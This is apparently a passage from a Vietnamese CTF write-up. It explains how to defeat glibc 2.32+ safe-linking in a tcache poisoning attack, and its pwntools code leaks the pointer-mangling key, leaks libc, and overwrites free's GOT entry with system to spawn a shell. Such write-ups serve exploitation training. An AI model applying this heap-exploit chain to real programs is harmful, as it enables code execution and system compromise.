- cách khai thác vẫn như cũ, vấn đề ở đây là từ bản 2.32 trở đi các chunk được free thì fd pointer của chunk đó không chứa địa chỉ liền kề trong tcache nữa mà là 1 key với key được tính bằng cách:
```
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```
- pos là chunk được free còn ptr là chunk đã được free trước đó trong cùng 1 size
- sau khi tạo các chunk và gây lỗi overflow thì nhiệm vụ tiếp theo của chúng ta là leak giá trị key này ra, chúng ta nên leak chunk cuối cùng trong tcache vì nó là chunk được free đầu tiên do đó ptr có giá trị là 0
```
payload = b'a'*60 + b'abcd'
note(2, 0, size_t, payload)
choice(0, 4)
r.recvuntil(b'abcd')
out = r.recv(2)
print(out)
```
- do là key của chunk cuối nên nó sẽ tương ứng với (pos >> 12) vì khi xor với 0 thì giá trị không đổi, do đó ta có thể dùng giá trị key này để tìm chunk tương ứng với công thức trên
```
ptr = newkey ^ (pos >> 12) = newkey ^ key
```
- vẫn địa chỉ 0x404000 là địa chỉ mà ta chọn
```
key = u32(out + b'\x00'*2)
new_chunk = key ^ (exe.got['free']-0x18)
print(hex(new_chunk))
```
- ta đã có được key của chunk mới
- bây giờ thì áp dụng kỹ thuật cũ để khai thác thôi
- tạo chunk fake -> leak libc -> overwrite free got
```
payload = b'a'*24 + p64(0x31) + p64(new_chunk)
note(2, 0, size_t, payload)

note(1, 1, size_t, b'/bin/sh\x00')
note(1, 2, size_t, b'a'*16)
note(1, -3, 48)

choice(2, 4)
r.recv(22)
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - 0x1e6ef0
print(hex(u64(libc_leak + b'\x00'*2)))
print(hex(libc.address))

payload = b'a'*0x18 + p64(libc.sym['system'])
note(2, 2, size_t, payload)
choice(1)
```
- ![Screenshot from 2023-02-08 17-41-09](https://user-images.githubusercontent.com/113702087/217507273-45c547e1-76c7-45db-bb8d-cae91fa407eb.png)
